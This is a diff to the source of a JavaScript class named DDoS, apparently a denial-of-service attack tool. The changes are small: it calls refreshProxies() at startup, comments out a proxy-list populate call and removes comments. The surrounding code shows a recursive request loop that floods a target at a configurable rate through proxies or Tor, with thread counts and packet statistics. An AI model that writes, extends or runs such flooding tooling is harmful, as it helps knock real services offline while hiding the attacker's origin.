@@ -38,6 +38,7 @@ class DDoS {
   this.log(`Encryption Key generated: ${this.encryptionKey}`);
 
   this.availableProxies = [];
+  this.refreshProxies();
 
   this.packetsSent = 0;
   this.mbps = 0;
@@ -60,7 +61,7 @@ class DDoS {
   this.setupTheme();
   this.toggleCustomCodeArea();
   this.autoFillTarget();
-  this.populateProxyList();
+  //this.populateProxyList();
 
   this.threadSliderInput.value = this.maxThreads;
   this.requestRateSliderInput.value = this.requestRate;
@@ -577,7 +578,7 @@ class DDoS {
   this.packetsSent = 0;
   this.dataSent = 0;
   this.errors = 0;
-  this.activeThreads = 0; // Reset active threads count
+  this.activeThreads = 0;
   this.target = target;
 
   this.attackThreads = [];
@@ -586,7 +587,6 @@ class DDoS {
    this.sendDDoSRequest(target);
   }
 
-  // Set a timeout to automatically stop the attack after 60 seconds (adjust as needed)
   this.attackTimeout = setTimeout(() => {
    this.stop();
    this.log('DDoS attack stopped automatically after 60 seconds.');
@@ -594,7 +594,7 @@ class DDoS {
  }
 
  async sendDDoSRequest(target) {
-  if (!this.running) return; // Stop if the attack is stopped
+  if (!this.running) return;
 
   try {
    const proxy = this.isTorEnabled ? this.torProxy : this.proxyList.value;
@@ -613,7 +613,7 @@ class DDoS {
    this.handleAttackError('DDoS', target, err);
   } finally {
    if (this.running) {
-    setTimeout(() => this.sendDDoSRequest(target), 1000 / this.requestRate); // Respect request rate
+    setTimeout(() => this.sendDDoSRequest(target), 1000 / this.requestRate);
     this.activeThreads = this.attackThreads.length;
    }
   }
@@ -886,7 +886,6 @@ class DDoS {
   this.dataSent = 0;
   this.target = '';
 
-  // Clear the attack timeout
   if (this.attackTimeout) {
    clearTimeout(this.attackTimeout);
    this.attackTimeout = null;
